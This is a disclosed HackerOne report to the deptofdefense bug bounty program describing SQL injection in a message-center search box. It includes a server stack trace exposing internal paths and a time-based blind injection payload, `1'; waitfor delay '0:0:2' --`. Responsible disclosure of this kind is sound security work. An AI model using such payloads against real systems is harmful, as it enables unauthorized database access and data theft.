# sql injection on  /messagecenter/messagingcenter at https://www.███████/

## Report Details
- **Report ID**: 381758
- **URL**: https://hackerone.com/reports/381758
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-07-14T23:01:00.139Z
- **Disclosed**: 2019-10-08T18:47:55.877Z

## Reporter
- **Username**: modam3r5
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hi , 
i would like to report an issues that lead to SQL injection in search box at https://www.████/messagecenter/messagingcenter , if you add the character `'` that usually used to test if the site have in `sql injection `  the site will return with  `Incorrect syntax` error that can confirm the site is effected with this bug .

#POC 
open the following link and enter `'` in the box will see this error in response https://www.█████████/messagecenter/messagingcenter 

```
Server Error in '/' Application.
Unclosed quotation mark after the character string ' ORDER BY StartDate2 DESC'.
Incorrect syntax near ' ORDER BY StartDate2 DESC'.
Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.

Exception Details: System.Data.SqlClient.SqlException: Unclosed quotation mark after the character string ' ORDER BY StartDate2 DESC'.
Incorrect syntax near ' ORDER BY StartDate2 DESC'.

Source Error:

An unhandled exception was generated during the execution of the current web request. Information regarding the origin and location of the exception can be identified using the exception stack trace below.

Stack Trace:


[SqlException (0x80131904): Unclosed quotation mark after the character string ' ORDER BY StartDate2 DESC'.
Incorrect syntax near ' ORDER BY StartDate2 DESC'.]
   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +1787822
   System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +5341894
   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning(TdsParserStateObject stateObj, Boolean callerHasConnectionLock, Boolean asyncClose) +546
   System.Data.SqlClient.TdsParser.TryRun(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj, Boolean& dataReady) +1693
   System.Data.SqlClient.SqlDataReader.TryConsumeMetaData() +61
   System.Data.SqlClient.SqlDataReader.get_MetaData() +90
   System.Data.SqlClient.SqlCommand.FinishExecuteReader(SqlDataReader ds, RunBehavior runBehavior, String resetOptionsString) +377
   System.Data.SqlClient.SqlCommand.RunExecuteReaderTds(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, Boolean async, Int32 timeout, Task& task, Boolean asyncWrite, SqlDataReader ds) +1421
   System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, TaskCompletionSource`1 completion, Int32 timeout, Task& task, Boolean asyncWrite) +177
   System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method) +53
   System.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior, String method) +137
   System.Data.SqlClient.SqlCommand.ExecuteDbDataReader(CommandBehavior behavior) +41
   System.Data.Common.DbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) +10
   System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +140
   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +316
   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet) +88
   GCSS_Army.MessageCenter.MessagingCenter.getMessages(String ssql) in C:\Users\████████\source\repos\New GCSS-Army\WebApplication4\WebApplication4\MessageCenter\MessagingCenter.aspx.cs:171
   GCSS_Army.MessageCenter.MessagingCenter.btnSearch_Click(Object sender, EventArgs e) in C:\Users\████\source\repos\New GCSS-Army\WebApplication4\WebApplication4\MessageCenter\MessagingCenter.aspx.cs:275
   System.Web.UI.WebControls.Button.OnClick(EventArgs e) +9663950
   System.Web.UI.WebControls.Button.RaisePostBackEvent(String eventArgument) +103
   System.Web.UI.WebControls.Button.System.Web.UI.IPostBackEventHandler.RaisePostBackEvent(String eventArgument) +10
   System.Web.UI.Page.RaisePostBackEvent(IPostBackEventHandler sourceControl, String eventArgument) +13
   System.Web.UI.Page.RaisePostBackEvent(NameValueCollection postData) +35
   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +1724

```

you can used this command `1'; waitfor delay '0:0:2' -- ` and the error page will return after `2` second

## Impact

An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information.

## Attachments
No attachments
